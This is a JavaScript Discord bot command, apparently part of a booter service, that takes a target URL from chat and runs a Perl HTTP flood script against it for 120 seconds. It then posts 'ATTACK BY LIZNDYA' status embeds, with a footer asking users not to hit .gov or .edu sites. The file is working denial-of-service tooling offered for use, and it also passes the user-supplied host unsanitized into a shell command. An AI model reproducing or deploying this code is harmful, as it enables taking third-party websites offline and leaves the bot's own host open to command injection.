const Discord = require("discord.js");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;

if (message.channel.id != room) {
	return;
  }

if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('CFB')
	.setDescription("`example .CFB https://example.com/`")
	.setFooter("pls don't attack .gov .edu")
	message.channel.send(embed1);
	return;
	}

var exec = require('child_process').exec
exec(`perl httpget ${host} 10000 50 100`, (error, stdout, stderr) => {
});
setTimeout(function(){ 
    console.log('Attack ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🚀 **ATTACK BY LIZNDYA** 🚀')
	.setTimestamp()
	.setDescription("**► attack done 💥**")
	.setFooter('© Developer: ROMEO', client.user.avatarURL)
	.setTimestamp()
	.setThumbnail("")
 message.channel.send(embed);
 }, 120000); //time in milliseconds
var gifler = ["https://blarrow.tech/wp-content/uploads/2020/06/featureAYUSHDUBEY.gif"];
    var randomgif = gifler[Math.floor((Math.random() * gifler.length))];
console.log('Start Attacking ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🚀 **ATTACK BY LIZNDYA** 🚀')
	.setTimestamp()
  .setDescription("**𝐔𝐬𝐞𝐫**: `" + message.author.username + "` \n **𝐇𝐨𝐬𝐭**: `" + host + "` \n **𝐌𝐞𝐭𝐡𝐨𝐝**: `CFB` \n **𝐓𝐢𝐦𝐞**: `120`")	
  .setFooter('© Developer: ROMEO', client.user.avatarURL)
	.setTimestamp()
	.setImage(randomgif)
	.setThumbnail("")
 message.channel.send(embed);
  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['CFB'],
  permLevel: 0
}

exports.help = {
  name: 'CFB',
  description: 'VenThings',
  usage: 'CFB'
}
